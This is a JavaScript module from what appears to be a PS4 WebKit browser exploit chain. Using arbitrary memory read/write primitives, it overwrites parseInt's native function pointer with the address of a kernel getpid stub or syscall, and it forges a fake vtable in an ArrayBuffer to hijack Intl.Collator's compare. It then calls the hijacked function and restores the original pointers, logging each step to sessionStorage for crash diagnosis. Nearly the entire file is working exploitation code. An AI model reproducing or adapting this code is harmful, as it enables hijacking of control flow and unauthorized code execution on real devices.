/**
 * Direct stub entry — NO G0-G5 slab. Step logs + flush before each dangerous op.
 */
import { int64 } from "./int64.js";
import { getCoreNative } from "./core.js?v=stub-core-3";

const COLLATOR_OFF = 0x18;
const ARENA_BYTES = 0x1000;
const FAKE_UC = 0x100;
const FAKE_VT = 0x300;
const MARK_OFF = 0xf00;
const SS_LAST = "wk-stub-last-step";
const JSFUNC_EXECUTABLE_OFF = 0x18;

function codeLooksNative(code4) {
    return code4 != null && code4 !== 0 && code4 !== 0xffffffff && code4 !== 0xcccccccc;
}

function numToI64(n) {
    if (n == null) return null;
    if (typeof n === "object" && n != null && "low" in n)
        return new int64(n.low >>> 0, (n.hi >>> 0));
    if (typeof n === "string") {
        const s = n.replace(/^0x/i, "").trim();
        if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
        if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
        if (s.length < 16) return new int64(parseInt(s.slice(-8), 16) >>> 0, 0);
        return new int64(
            parseInt(s.slice(-8), 16) >>> 0,
            parseInt(s.slice(0, -8), 16) >>> 0);
    }
    if (!Number.isFinite(n) || n <= 0) return null;
    return new int64(n >>> 0, Math.floor(n / 0x100000000) >>> 0);
}

/** PS4 webkit fn ptr — 0x80–0x8f module range; don't require read4 probe. */
function plausibleNativeFn64(p, ptr) {
    if (!ptr) return false;
    if (ptr.hi >= 0x80 && ptr.hi <= 0x8f) return true;
    const q = read4p(p, ptr);
    if (codeLooksNative(q)) return true;
    return ptr.hi >= 0x8;
}

function read4p(p, addr) {
    try {
        const v = p.read4(addr);
        if (v == null) return null;
        return (v.low >>> 0) | ((v.hi >>> 0) * 0x100000000);
    } catch (_) {
        return null;
    }
}

function putLow48(view, off, ptr) {
    const lo = ptr.low >>> 0;
    const hi = ptr.hi >>> 0;
    view[off] = lo & 0xff;
    view[off + 1] = (lo >>> 8) & 0xff;
    view[off + 2] = (lo >>> 16) & 0xff;
    view[off + 3] = (lo >>> 24) & 0xff;
    view[off + 4] = hi & 0xff;
    view[off + 5] = (hi >>> 8) & 0xff;
    view[off + 6] = 0;
    view[off + 7] = 0;
}

function stubCtx(opts) {
    const log = opts && opts.log ? opts.log : function () { };
    const flush = opts && opts.flush ? opts.flush : function () { };
    function step(tag, detail) {
        log(tag, detail);
        try { sessionStorage.setItem(SS_LAST, tag + (detail ? " " + detail : "")); } catch (_) { }
        flush();
    }
    return { step, log, flush };
}

export function captureParseIntMainMf(p, off, opts) {
    opts = opts || {};
    const { step } = stubCtx(opts);
    if (!p || typeof p.leakval !== "function")
        throw new Error("stub: no primitive p");
    if (!off) throw new Error("stub: no offset table (wrong UA?)");

    const carrier = opts.carrier
        || (typeof window !== "undefined" ? window._wkCarrier : null);
    const mOff = off.wk_JSFunction_m_function || 0x28;

    const nat = getCoreNative(carrier);
    if (nat) {
        const exec = numToI64(nat.executable);
        const tc = numToI64(nat.targetCell);
        let mainOrig = numToI64(nat.nativeFn);
        if (exec && tc) {
            const mainMf = exec.add32(mOff);
            if (!mainOrig || !plausibleNativeFn64(p, mainOrig)) {
                try { mainOrig = p.read8(mainMf); } catch (_) { mainOrig = null; }
            }
            if (mainOrig && plausibleNativeFn64(p, mainOrig)) {
                const probe = read4p(p, mainOrig);
                step("STUB-CAP0", "carrier.native exec=" + exec + " fn=" + mainOrig);
                step("STUB-CAP3", "mainMf=" + mainMf + " orig=" + mainOrig
                    + " probe=0x" + (probe != null ? probe.toString(16) : "skip"));
                return {
                    cell: tc,
                    jfn: exec,
                    mainMf,
                    mainOrig,
                    nativeFn: mainOrig,
                    path: "carrier-native",
                };
            }
            step("STUB-CAP0", "carrier.native bad fn=" + mainOrig + " — scan");
        }
    } else {
        step("STUB-CAP0", "no carrier.native — scan parseInt");
    }

    step("STUB-CAP1", "leakval parseInt");
    const cell = p.leakval(parseInt);
    step("STUB-CAP2", "cell=" + cell);
    const jfn = p.read8(cell.add32(JSFUNC_EXECUTABLE_OFF));
    if (!jfn) throw new Error("stub: no exec @ parseInt+0x18");

    const cands = [];
    const scanOffs = [mOff, 0x20, 0x28, 0x30, 0x38, 0x8, 0x10];
    for (let i = 0; i < scanOffs.length; i++) {
        const o = scanOffs[i];
        let fn = null;
        try { fn = p.read8(jfn.add32(o)); } catch (_) { fn = null; }
        if (fn) cands.push({ o, fn });
    }

    let pick = null;
    for (let i = 0; i < cands.length; i++) {
        if (plausibleNativeFn64(p, cands[i].fn)) {
            pick = cands[i];
            break;
        }
    }
    if (!pick && cands.length) pick = cands[0];

    if (!pick) throw new Error("stub: mainMf capture failed — no candidates @ jfn=" + jfn);

    const mainMf = jfn.add32(pick.o);
    const mainOrig = pick.fn;
    const probe = read4p(p, mainOrig);
    step("STUB-CAP3", "mainMf=" + mainMf + " orig=" + mainOrig
        + " off=0x" + pick.o.toString(16)
        + " probe=0x" + (probe != null ? probe.toString(16) : "null")
        + (plausibleNativeFn64(p, mainOrig) ? " OK" : " WEAK"));

    if (!plausibleNativeFn64(p, mainOrig))
        throw new Error("stub: mainOrig not code orig=" + mainOrig
            + " probe=0x" + (probe != null ? probe.toString(16) : "null"));

    return {
        cell,
        jfn,
        mainMf,
        mainOrig,
        nativeFn: mainOrig,
        path: "scan+0x" + pick.o.toString(16),
    };
}

export function resolveGetpidStub(lk, off, prefer) {
    if (!lk || !off) throw new Error("stub: need lk+off");
    const kinds = [];
    if (prefer === "syscall" || prefer === "all")
        kinds.push("syscall");
    if (prefer === "stub20" || prefer === "all" || !prefer)
        kinds.push("stub20");
    if (prefer === "syscall") { /* done */ }
    else if (prefer !== "stub20" && off.k_getpid_syscall != null)
        kinds.push("syscall");
    const out = [];
    if (kinds.indexOf("stub20") >= 0 && off.k_stubs && off.k_stubs[20] != null)
        out.push({ addr: lk.add32(off.k_stubs[20]), tag: "stub20+0x" + off.k_stubs[20].toString(16) });
    if (kinds.indexOf("syscall") >= 0 && off.k_getpid_syscall != null)
        out.push({ addr: lk.add32(off.k_getpid_syscall), tag: "syscall+0x" + off.k_getpid_syscall.toString(16) });
    if (!out.length) throw new Error("stub: no getpid offset");
    return out;
}

export function fireStubSwapParseInt(p, off, lk, opts) {
    opts = opts || {};
    const { step } = stubCtx(opts);
    const carrier = opts.carrier || (typeof window !== "undefined" ? window._wkCarrier : null);
    const cap = captureParseIntMainMf(p, off, opts);
    const stubs = resolveGetpidStub(lk, off, opts.stubKind || "all");
    const stub = stubs[opts.stubIdx != null ? opts.stubIdx : 0];

    let fireArg;
    let argLabel;
    if (opts.arg !== undefined) {
        fireArg = opts.arg;
        argLabel = "custom";
    } else if (opts.useTextarea !== false && carrier && carrier.textarea) {
        fireArg = carrier.textarea;
        argLabel = "textarea";
    } else {
        fireArg = 1;
        argLabel = "literal-1";
    }

    step("STUB-ARM", "write " + stub.tag + " → mainMf=" + cap.mainMf);
    p.write8(cap.mainMf, stub.addr);
    const armed = p.read8(cap.mainMf);
    step("STUB-ARM-CHK", "got=" + armed + " want=" + stub.addr);
    if (!armed || String(armed) !== String(stub.addr))
        throw new Error("stub: arm write did not stick");

    if (opts.armOnly)
        return { path: "stub-arm-only", stub: stub.addr, stubTag: stub.tag, mainMf: cap.mainMf, armed: true };

    step("STUB-FIRE", "parseInt(" + argLabel + ") — OOM/crash past here = entered stub");
    let result = NaN;
    let err = null;
    try {
        result = parseInt(fireArg);
    } catch (e) {
        err = e;
    } finally {
        try {
            p.write8(cap.mainMf, cap.mainOrig);
            step("STUB-RESTORE", "mainMf restored");
        } catch (re) {
            step("STUB-RESTORE-FAIL", re.message || String(re));
        }
    }
    if (err) throw err;
    step("STUB-DONE", "jsResult=" + result);
    return {
        path: "stub-swap-parseInt",
        stub: stub.addr,
        stubTag: stub.tag,
        mainMf: cap.mainMf,
        mainOrig: cap.mainOrig,
        fireArg: argLabel,
        result,
    };
}

function arenaBacking(p, view) {
    const cell = p.leakval(view);
    const ptr = p.read8(cell.add32(0x10));
    if (!ptr || ptr.hi < 0x80 || ptr.hi > 0x8f) return null;
    if (p.read1(ptr.add32(MARK_OFF)) !== 0x52) return null;
    return ptr;
}

export function pinCollatorStub(retain) {
    retain = retain || [];
    const collator = new Intl.Collator("en", { usage: "search" });
    const compareFn = collator.compare;
    if (!(compareFn("a", "b") < 0)) throw new Error("collator stub: compare broken");
    const ab = new ArrayBuffer(ARENA_BYTES);
    const view = new Uint8Array(ab);
    view[MARK_OFF] = 0x52;
    view[MARK_OFF + 1] = 0x4f;
    view[MARK_OFF + 2] = 0x50;
    view[MARK_OFF + 3] = 0x31;
    const compareArg = "\x00";
    retain.push(collator, compareFn, ab, view, compareArg);
    return {
        collator,
        compareFn,
        compareArg,
        view,
        ab,
        buildFake: function (p) {
            const backing = arenaBacking(p, view);
            if (!backing) throw new Error("collator stub: arena fail");
            const fakeUC = backing.add32(FAKE_UC);
            const fakeVT = backing.add32(FAKE_VT);
            putLow48(view, FAKE_UC, fakeVT);
            for (let i = 0x48; i < 0x50; i++) view[FAKE_UC + i] = 0;
            for (let i = 0x60; i < 0x68; i++) view[FAKE_UC + i] = 0;
            return {
                backing,
                fakeUC,
                fakeVT,
                field: p.leakval(collator).add32(COLLATOR_OFF),
            };
        },
    };
}

export function fireCollatorStub(p, pin, lk, off, opts) {
    opts = opts || {};
    const { step } = stubCtx(opts);
    if (!pin || !pin.compareFn) throw new Error("collator stub: pin first");
    const stubs = resolveGetpidStub(lk, off, opts.stubKind || "all");
    const stub = stubs[0];
    step("STUB-COL1", "build fake");
    const fake = pin.buildFake(p);
    putLow48(pin.view, FAKE_VT + 0x128, stub.addr);
    putLow48(pin.view, FAKE_UC + 0xe0, stub.addr);
    step("STUB-COL2", "prewarm compare");
    const pre = pin.compareFn(pin.compareArg, "b");
    if (!Number.isFinite(pre)) throw new Error("collator prewarm fail pre=" + pre);
    const orig = p.read8(fake.field);
    p.write8(fake.field, fake.fakeUC);
    step("STUB-COL-FIRE", stub.tag + " — crash past here = entered stub");
    let result = NaN;
    let err = null;
    try {
        result = pin.compareFn(pin.compareArg, "b");
    } catch (e) {
        err = e;
    } finally {
        try { p.write8(fake.field, orig); } catch (_) { }
    }
    if (err) throw err;
    step("STUB-COL-DONE", "result=" + result);
    return {
        path: "collator-stub-direct",
        stub: stub.addr,
        stubTag: stub.tag,
        pre,
        result,
        fakeUC: fake.fakeUC,
    };
}

export function verifyStubSwapArm(p, off, lk, opts) {
    return fireStubSwapParseInt(p, off, lk, Object.assign({}, opts || {}, { armOnly: true }));
}

export { SS_LAST as STUB_LAST_STEP_KEY };
